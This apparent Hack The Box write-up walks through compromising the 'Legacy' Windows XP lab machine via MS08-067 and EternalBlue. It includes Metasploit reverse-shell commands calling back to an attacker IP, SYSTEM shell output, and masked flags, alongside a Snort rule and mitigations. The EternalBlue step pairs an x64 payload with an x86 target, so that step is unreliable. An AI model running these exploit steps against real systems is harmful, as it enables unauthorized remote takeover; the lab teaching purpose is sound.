---
title: HTB easy
description: 
date: 2025-07-18T14:00:00Z
draft: false
weight: 1
tags:
  - SMB
categories: Red Team
author: 
TocOpen: true
showReadingTime: true
showTableOfContents: true
featuredImage: images/test.png
---

cover: image: "images/htb-logo.png"

---

## Machine Overview

Legacy is a beginner-friendly Windows machine that demonstrates the impact of unpatched systems. This machine is vulnerable to several critical SMB exploits including MS08-067 and MS17-010 (EternalBlue).

**Target Details:**
- **IP Address:** `10.10.10.4`
- **Operating System:** Windows XP SP3
- **Difficulty:** Easy
- **Points:** 20
- **Release Date:** March 2017

![Legacy Machine Info](images/test.png)

## Initial Reconnaissance

### Port Scanning

Starting with an initial Nmap scan to identify open ports and services:

```bash
nmap -sC -sV -oN nmap/initial.txt 10.10.10.4
```

**Results:**
```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.10.10.4
Host is up (0.045s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds

Host script results:
|_clock-skew: mean: 5d00h27m39s, deviation: 2h07m16s, median: 4d22h57m39s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:81:18 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|   System time: 2025-07-25T18:57:39+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|   message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
```

![Nmap Scan Results](images/nmap-results.png)

### SMB Enumeration

Let's enumerate the SMB service more thoroughly:

```bash
# Check for SMB vulnerabilities
nmap --script smb-vuln* -p 445 10.10.10.4
```

**Critical Findings:**
```
Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, 
|           Server 2003 SP1 and SP2, Vista Gold and SP1, Server 2008, and 7 Pre-Beta 
|           allows remote attackers to execute arbitrary code via a crafted RPC request

| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|           Risk factor: HIGH
|           A critical remote code execution vulnerability exists in Microsoft SMBv1
```

![SMB Vulnerabilities Found](images/smb-vulnerabilities.png)

## Exploitation Strategy

The machine is vulnerable to multiple critical SMB exploits. We have two main options:

1. **MS08-067** - Netapi vulnerability (older, more reliable)
2. **MS17-010** - EternalBlue exploit (newer, more famous)

### Method 1: MS08-067 Exploitation

#### Setting up Metasploit

```bash
msfconsole
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.10.10.4
set LHOST tun0
show options
```

![Metasploit Configuration](images/metasploit-ms08067.png)

#### Payload Selection

```bash
set payload windows/shell_reverse_tcp
set LHOST 10.10.14.15
exploit
```

**Success!** We get a shell immediately:

![Successful Exploitation](images/shell-obtained.png)

```cmd
C:\WINDOWS\system32>whoami
nt authority\system

C:\WINDOWS\system32>hostname
legacy
```

### Method 2: MS17-010 (EternalBlue)

For educational purposes, let's also demonstrate the EternalBlue exploit:

```bash
# Using Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.4
set LHOST 10.10.14.15
set payload windows/x64/shell_reverse_tcp
exploit
```

![EternalBlue Exploitation](images/eternalblue-exploit.png)

## Post-Exploitation

### System Information

```cmd
C:\WINDOWS\system32>systeminfo
Host Name:                 LEGACY
OS Name:                   Microsoft Windows XP Professional
OS Version:                5.1.2600 Service Pack 3 Build 2600
System Type:               X86-based PC
```

![System Information](images/systeminfo.png)

### Flag Collection

#### User Flag

Since we have SYSTEM access, we can access any user's files:

```cmd
C:\WINDOWS\system32>dir C:\Documents and Settings\john\Desktop\
 Volume in drive C has no label.
 Directory of C:\Documents and Settings\john\Desktop

16/03/2017  08:32    <DIR>          .
16/03/2017  08:32    <DIR>          ..
16/03/2017  08:32                32 user.txt
```

```cmd
C:\WINDOWS\system32>type "C:\Documents and Settings\john\Desktop\user.txt"
e69af0e4f443de72dcb□□□□□□□□□□□□□□□□
```

![User Flag Retrieved](images/user-flag.png)

#### Root Flag

```cmd
C:\WINDOWS\system32>type "C:\Documents and Settings\Administrator\Desktop\root.txt"
993442d258b0e0ec917c□□□□□□□□□□□□□□□□
```

![Root Flag Retrieved](images/root-flag.png)

## Vulnerability Analysis

### MS08-067 Technical Details

The MS08-067 vulnerability exists in the Server service's handling of RPC requests. Here's what makes it dangerous:

![Vulnerability Timeline](images/vulnerability-timeline.png)

**Key Points:**
- **CVE ID:** CVE-2008-4250
- **CVSS Score:** 10.0 (Critical)
- **Affected Systems:** Windows 2000, XP, Server 2003, Vista
- **Attack Vector:** Network (RPC over SMB)
- **Authentication Required:** None

### MS17-010 (EternalBlue) Details

Originally developed by the NSA and leaked by the Shadow Brokers group:

**Impact Assessment:**
- **Wormable:** Can spread automatically across networks
- **Authentication:** Not required
- **Privilege Level:** SYSTEM (highest)
- **Notable Usage:** WannaCry and NotPetya ransomware

![EternalBlue Impact](images/eternalblue-impact.png)

## Detection and Mitigation

### Detection Methods

Network-based detection signatures:

```bash
# Snort rule for MS08-067
alert tcp any any -> any 445 (msg:"MS08-067 Exploit Attempt"; 
content:"|ff|SMB|25|"; offset:4; depth:5; sid:100001;)
```

### Mitigation Strategies

![Mitigation Strategies](images/mitigation-strategies.png)

1. **Patch Management**
   - Apply MS08-067 security update immediately
   - Implement automated patching policies

2. **Network Segmentation**
   - Restrict SMB traffic between network segments
   - Use firewalls to block ports 139 and 445 externally

3. **SMB Configuration**
   - Disable SMBv1 protocol entirely
   - Enable SMB signing where possible

4. **Monitoring**
   - Monitor for unusual SMB traffic patterns
   - Log failed authentication attempts

## Lessons Learned

### Technical Takeaways

![Lessons Learned Summary](images/lessons-summary.png)

1. **Patch Management is Critical**
   - Legacy systems without patches are extremely vulnerable
   - Even "air-gapped" systems can be compromised via physical access

2. **Defense in Depth**
   - Multiple security layers could have prevented this attack
   - Network segmentation limits blast radius

3. **Vulnerability Disclosure Timeline**
   - MS08-067: Patched in October 2008
   - MS17-010: Patched in March 2017
   - Both were actively exploited in the wild

### Real-World Implications

This machine demonstrates vulnerabilities that affected millions of systems:

- **WannaCry Ransomware (2017):** Used MS17-010 to spread globally
- **Conficker Worm (2008):** Leveraged MS08-067 for propagation
- **Corporate Networks:** Many organizations still run unpatched legacy systems

![Real World Impact](images/real-world-impact.png)

## Tools and Resources

### Tools Used

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **Nmap** | Port scanning & vulnerability detection | `nmap --script smb-vuln* -p 445 target` |
| **Metasploit** | Exploitation framework | `use exploit/windows/smb/ms08_067_netapi` |
| **Wireshark** | Network traffic analysis | GUI-based packet capture |

### Additional Resources

![Additional Resources](images/resources.png)

- [Microsoft Security Bulletin MS08-067](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067)
- [MS17-010 Technical Analysis](https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/)
- [MITRE ATT&CK - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)

## Conclusion

Legacy demonstrates the severe impact of unpatched systems in production environments. Both MS08-067 and MS17-010 provide immediate SYSTEM-level access, highlighting the importance of:

1. **Timely patch management**
2. **Network segmentation** 
3. **Vulnerability scanning**
4. **Defense in depth strategies**

This machine serves as an excellent introduction to SMB exploitation techniques and emphasizes why legacy systems pose significant security risks.

![Machine Completed](images/machine-pwned.png)

**Final Stats:**
- **Time to Root:** ~15 minutes
- **Difficulty Rating:** 2/10
- **Key Learning:** SMB vulnerability exploitation
- **Next Steps:** Try intermediate machines like Blue or Devel

---

*Remember: These techniques should only be used in authorized testing environments like Hack The Box, personal labs, or during legitimate penetration testing engagements.*